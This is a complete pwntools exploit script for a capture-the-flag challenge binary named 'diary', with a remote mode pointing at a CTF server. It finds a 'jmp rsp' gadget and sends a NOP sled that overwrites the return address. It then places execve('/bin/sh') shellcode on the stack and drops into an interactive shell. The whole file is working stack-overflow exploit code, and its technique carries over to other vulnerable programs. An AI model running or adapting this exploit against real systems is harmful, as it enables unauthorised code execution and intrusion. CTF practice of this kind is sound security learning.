#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("diary")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("challs.tfcctf.com", 32439)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#=======================================================================================

# Find jmp rsp gadget
jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

# Prepare shellcode to drop a shell
shellcode = asm("shellcode:" + shellcraft.execve("/bin/sh"))

# Overwrite the return address with the jmp_rsp gadget's memory address to execute our shellcode
payload = asm("nop")*264 + p64(jmp_rsp) + asm("nop")*16 + shellcode

# Send the payload
io.sendline(payload)

#=======================================================================================

# Interact with the process
io.interactive()